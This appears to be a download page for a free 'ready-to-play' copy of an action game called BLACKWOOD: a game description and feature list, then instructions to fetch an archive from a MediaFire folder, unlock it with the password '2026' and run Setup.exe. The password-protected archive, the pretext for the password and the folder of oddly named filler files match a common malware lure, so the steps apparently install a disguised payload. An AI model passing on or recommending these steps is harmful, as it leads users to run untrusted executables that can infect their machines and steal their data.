## 🕹️ About

BLACKWOOD is a cinematic third-person action thriller developed by AttritoM7 Productions and published by IZilla Games. Set in 2012 New York, it follows Anton Blackwood, who runs a DVD store by day and works as a contract killer by night. The core loop combines store management, story missions, exploration, responsive gunplay, grounded melee combat, brutal takedowns, and a double life shaped by survival and morality. Act One released on September 16, 2026, as the first complete part of a planned three-act story, with later acts planned as free updates rather than Early Access content. This ready-to-play release is packaged for quick setup: unpack, run, and play.

BLACKWOOD is for players who enjoy cinematic single-player action games, third-person shooters, crime thrillers, and story-driven experiences with a distinctive management twist.

## ✨ Features

- 📀 **DVD Store Management** — Manage Anton’s store and balance its legitimate business with his dangerous nighttime work.
- 📖 **Three-Act Story** — Experience a complete first act designed to advance into a larger continuing narrative.
- 🎭 **Double Life** — Switch between ordinary daytime responsibilities and contract-killing missions after dark.
- 🔫 **Cinematic Third-Person Combat** — Fight through New York with responsive gunplay, grounded melee combat, and brutal takedowns.
- 🎯 **Missions and Challenges** — Take on main story missions, side missions, challenges, achievements, and leaderboards.
- 🌃 **2012 New York** — Explore a gritty, atmospheric recreation of New York City.

### Step 1: Download

Download the ready-to-play package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- patch_1.bnk <- Audio banks
|-- dlc.md5 <- DLC checksums
|-- launcher.dll <- Launcher library
|-- global.cfg <- Global settings
|-- res.pak <- Resources archive
|-- lang.sys <- Language system
|-- uninstall.key <- Uninstall key
|-- license.bank <- License data
|-- localization.ini <- Language files
|-- settings.bin <- Configuration
|-- update_1.ini <- Update config
|-- animations.dll <- Animation system
|-- audio.res <- Audio resources
|-- driver.pak <- Driver archive
|-- Password 2026.txt <- Password reminder (empty)
|-- update_1.res <- Update resources
|-- installer.dat <- Installer data
|-- driver.umap <- Driver data
|-- license.wem <- Audio assets
|-- assets.wem <- Asset audio
|-- scripts.lic <- Game scripts
|-- bootstrap.wem <- Bootstrap audio
|-- physics.sys <- Physics engine
|-- api.pak <- API modules
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game is ready to play
